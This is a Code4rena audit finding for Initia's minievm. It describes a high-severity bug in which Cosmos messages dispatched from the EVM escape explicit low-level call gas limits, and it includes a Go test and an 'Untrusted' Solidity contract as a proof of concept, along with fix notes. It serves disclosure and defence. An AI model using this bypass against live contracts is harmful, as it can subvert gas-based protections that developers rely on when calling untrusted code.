---
tags:
  - lang/solidity
  - sector/infra
  - sector/token
  - platform/code4rena
  - has/github
  - has/poc
  - severity/high
protocol: "[[Initia]]"
auditors:
  - berndartmueller
report: "https://code4rena.com/reports/2025-02-initia-cosmos"
genome:
  - "[[dos-resistance]]"
  - "[[variant]]"
---
# [H-06] Explicit gas limit on low-level Solidity calls can be bypassed by dispatched EVM calls via the custom Cosmos precompile

- id: 55309
- impact: HIGH
- protocol: Initia
- reporter: berndartmueller (Code4rena)
- source: https://code4rena.com/reports/2025-02-initia-cosmos

## Summary


The bug report discusses an issue where a Solidity contract can bypass a restricted gas limit by using the Cosmos SDK messages feature. This can be exploited by a malicious contract to execute more code than intended. A proof of concept is provided and recommended mitigation steps are suggested. The issue has been confirmed and fixed by the developers.

## Details



<https://github.com/initia-labs/minievm/blob/744563dc6a642f054b4543db008df22664e4c125/x/evm/keeper/context.go# L556>

### Finding description and impact

It is possible to dispatch Cosmos SDK messages from within a Solidity contract, by using the [custom cosmos precompile](https://github.com/initia-labs/minievm/blob/744563dc6a642f054b4543db008df22664e4c125/x/evm/precompiles/cosmos/contract.go# L287-L294).

Those Cosmos SDK messages (e.g. `MsgCall`), specifically `ExecuteRequest`, are then dispatched and executed after the EVM call has successfully executed in [`dispatchMessage()`](https://github.com/initia-labs/minievm/blob/744563dc6a642f054b4543db008df22664e4c125/x/evm/keeper/context.go# L491-L574) via the message handler in line `556`.
```

491: func (k Keeper) dispatchMessage(parentCtx sdk.Context, request types.ExecuteRequest) (logs types.Logs, err error) {
... 	// [...]
547:
548: 	// find the handler
549: 	handler := k.msgRouter.Handler(msg)
550: 	if handler == nil {
551: 		err = types.ErrNotSupportedCosmosMessage
552: 		return
553: 	}
554:
555: 	// and execute it
556: 	res, err := handler(ctx, msg)
557: 	if err != nil {
558: 		return
559: 	}
560:
561: 	// emit events
562: 	ctx.EventManager().EmitEvents(res.GetEvents())
563:
564: 	// extract logs
565: 	dispatchLogs, err := types.ExtractLogsFromResponse(res.Data, sdk.MsgTypeURL(msg))
566: 	if err != nil {
567: 		return
568: 	}
569:
570: 	// append logs
571: 	logs = append(logs, dispatchLogs...)
572:
573: 	return
574: }
```

However, as we can see above in the code snippet, there is no new, local, gas meter created for the handler. Instead, the same gas meter as the parent call, i.e., the `MsgCall` that initiated the root EVM call, is used. Hence, the same gas limit is used for the dispatched message as for the parent call.

This can be exploited by a solidity contract that’s called with a restricted gas limit (e.g. by using low-level call with `gas` set to 100k), which can use the `COSMOS_CONTRACT` precompile (at address `0xf1`) to schedule another EVM `MsgCall`. This EVM call (`MsgCall`) is then not restricted with the same gas limit as provided in the low-level call, rather it can use the full parent’s gas limit.

Contrary to what a Solidity developer would expect when explicitly setting a gas limit on a low-level call, e.g., where the target contract is not fully trusted due to being an arbitrary external call.

Note that the same issue applies to the [`callback` call in the `defer` block](https://github.com/initia-labs/minievm/blob/744563dc6a642f054b4543db008df22664e4c125/x/evm/keeper/context.go# L539) of the `dispatchMessage()` function. The callback EVM call also uses the same gas meter as the parent call.

### Proof of Concept

The following git diff adds a test case `Test_CallChildContractBypassingGasLimit` to `context_test.go`, which demonstrates that a child contract that is called with an explicit gas limit of 100k via a low-level call can bypass this gas limit via the `CosmosPrecompile` precompile to dispatch an EVM call that is then executed with the initial gas limit (1M).

Specifically, the `nested()` function will emit `NestedCalled` with the `gasleft()` value, showing that it was called with almost the full 1M gas limit, instead of the 100k gas limit.
```

diff --git a/x/evm/keeper/context_test.go b/x/evm/keeper/context_test.go
index 82eee5f..98deb32 100644
--- a/x/evm/keeper/context_test.go
+++ b/x/evm/keeper/context_test.go
@@ -2,6 +2,7 @@ package keeper_test

 import (
 	"fmt"
+	"math/big"
 	"strings"
 	"testing"

@@ -13,10 +14,11 @@ import (
 	"github.com/holiman/uint256"
 	"golang.org/x/crypto/sha3"

+	storetypes "cosmossdk.io/store/types"
 	sdk "github.com/cosmos/cosmos-sdk/types"
-
 	"github.com/initia-labs/minievm/x/evm/contracts/counter"
 	"github.com/initia-labs/minievm/x/evm/contracts/erc20"
+	"github.com/initia-labs/minievm/x/evm/contracts/untrusted"
 	"github.com/initia-labs/minievm/x/evm/types"

 	"github.com/stretchr/testify/require"
@@ -260,6 +262,54 @@ func Test_RecursiveDepth(t *testing.T) {
 	require.ErrorContains(t, err, types.ErrExceedMaxRecursiveDepth.Error())
 }

+func Test_CallChildContractBypassingGasLimit(t *testing.T) {
+	ctx, input := createDefaultTestInput(t)
+	_, _, addr := keyPubAddr()
+
+	counterBz, err := hexutil.Decode(counter.CounterBin)
+	require.NoError(t, err)
+
+	// deploy counter contract
+	caller := common.BytesToAddress(addr.Bytes())
+	retBz, contractAddr, _, err := input.EVMKeeper.EVMCreate(ctx, caller, counterBz, nil, nil)
+	require.NoError(t, err)
+	require.NotEmpty(t, retBz)
+	require.Len(t, contractAddr, 20)
+
+	// deploy `Untrusted` child contract
+	untrustedBz, err := hexutil.Decode(untrusted.UntrustedBin)
+	require.NoError(t, err)
+
+	retBz, untrustedContractAddr, _, err := input.EVMKeeper.EVMCreate(ctx, caller, untrustedBz, nil, nil)
+	require.NoError(t, err)
+	require.NotEmpty(t, retBz)
+	require.Len(t, untrustedContractAddr, 20)
+
+	// call recursive function
+	parsed, err := counter.CounterMetaData.GetAbi()
+	require.NoError(t, err)
+
+	inputBz, err := parsed.Pack("recursive", untrustedContractAddr)
+	require.NoError(t, err)
+
+	// call with 1M gas limit
+	ctx = ctx.WithGasMeter(storetypes.NewGasMeter(1_000_000))
+
+	_, logs, err := input.EVMKeeper.EVMCall(ctx, caller, contractAddr, inputBz, nil, nil)
+	require.Equal(t, 2, len(logs))
+	require.NoError(t, err)
+
+	// extract gas left value from `NestedCalled` event
+	log := logs[1]
+	gasReceived, success := new(big.Int).SetString(log.Data[2:], 16)
+	require.True(t, success)
+
+	// check that gasReceived is greater than the low-level call gas limit of 100_000
+	require.Greater(t, int(gasReceived.Int64()), 100_000)
+
+	// @audit-info gasReceived is actually ~919_013, almost all of the initial 1M gas limit
+}
+
 func Test_RevertAfterExecuteCosmos(t *testing.T) {
 	ctx, input := createDefaultTestInput(t)
 	_, _, addr := keyPubAddr()
```

The following git diff:

* Adds a new `Untrusted` contract that is called by `Counter.recursive` with an explicit gas limit of 100k.
* Amends `Counter.recursive` to call the `Untrusted` contract with an explicit gas limit.
```

diff --git a/x/evm/contracts/counter/Counter.sol b/x/evm/contracts/counter/Counter.sol
index 2c5166e..2617ff9 100644
--- a/x/evm/contracts/counter/Counter.sol
+++ b/x/evm/contracts/counter/Counter.sol
@@ -10,7 +10,7 @@ contract Counter is IIBCAsyncCallback {

     event increased(uint256 oldCount, uint256 newCount);
     event callback_received(uint64 callback_id, bool success);
-    event recursive_called(uint64 n);
+    event recursive_called();

     constructor() payable {}

@@ -74,17 +74,13 @@ contract Counter is IIBCAsyncCallback {
         return blockhash(n);
     }

-    function recursive(uint64 n) public {
-        emit recursive_called(n);
+    function recursive(address child) public {
+        emit recursive_called();

-        if (n == 0) {
-            return;
-        }
-
-        COSMOS_CONTRACT.execute_cosmos(_recursive(n));
+        // call child contract with an explicit gas limit
+        (bool success, ) = address(child).call{ gas: 100_000 }(abi.encodeWithSignature("foo()"));

-        // to test branching
-        COSMOS_CONTRACT.execute_cosmos(_recursive(n));
+        require(success, "recursive call failed");
     }

     function _recursive(uint64 n) internal returns (string memory message) {
diff --git a/x/evm/contracts/untrusted/Untrusted.sol b/x/evm/contracts/untrusted/Untrusted.sol
new file mode 100644
index 0000000..460edcc
--- /dev/null
+++ b/x/evm/contracts/untrusted/Untrusted.sol
@@ -0,0 +1,39 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.25;
+
+import "../i_cosmos/ICosmos.sol";
+import "../strings/Strings.sol";
+
+contract Untrusted {
+    event NestedCalled(uint256 gasReceived);
+
+    function foo() external {
+        COSMOS_CONTRACT.execute_cosmos(_nested());
+    }
+
+    // Called as a dispatched message
+    function nested() external {
+        emit NestedCalled(gasleft());
+    }
+
+    function _nested() internal returns (string memory message) {
+        message = string(
+            abi.encodePacked(
+                '{"@type": "/minievm.evm.v1.MsgCall",',
+                '"sender": "',
+                COSMOS_CONTRACT.to_cosmos_address(address(this)),
+                '",',
+                '"contract_addr": "',
+                Strings.toHexString(address(this)),
+                '",',
+                '"input": "',
+                Strings.toHexString(
+                    abi.encodePacked(this.nested.selector)
+                ),
+                '",',
+                '"value": "0",',
+                '"access_list": []}'
+            )
+        );
+    }
+}
```

Make sure to run `make contracts-gen` to generate the Go bindings for the Solidity contracts before running the test.

### Recommended mitigation steps

Consider providing the cosmos precompile’s remaining gas as an additional parameter in `ExecuteRequest` when [dispatching the request](https://github.com/initia-labs/minievm/blob/744563dc6a642f054b4543db008df22664e4c125/x/evm/precompiles/cosmos/contract.go# L288-L294).

This would allow using this gas limit in `dispatchMessage()` to create a custom gas meter with the specific gas limit, ensuring that dispatched messages are limited to the intended gas limit.

**[beer-1 (Initia) confirmed and commented](https://code4rena.com/audits/2025-02-initia-cosmos/submissions/F-11?commentParent=CTadhjwj3mw):**

> Fixed [here](https://github.com/initia-labs/minievm/pull/165/commits/c7afb0edc4f1535d15423a3707d953ac48328971# diff-4aaff0c187848f578730cdb177b834f037f8f35b444dbdd87bb000129c45369b).

**[Initia mitigated](https://github.com/code-423n4/2025-03-initia-cosmos-mitigation?tab=readme-ov-file# mitigation-of-high--medium-severity-issues):**

> Introduced to use `submsg` gas limit.

**Status:** Unmitigated. Full details in reports from [berndartmueller](https://code4rena.com/audits/2025-03-initia-cosmos-mitigation-review/submissions/S-21) and [0xAlix2](https://code4rena.com/audits/2025-03-initia-cosmos-mitigation-review/submissions/S-49), and also included in the [Mitigation Review](# mitigation-review) section below.

---


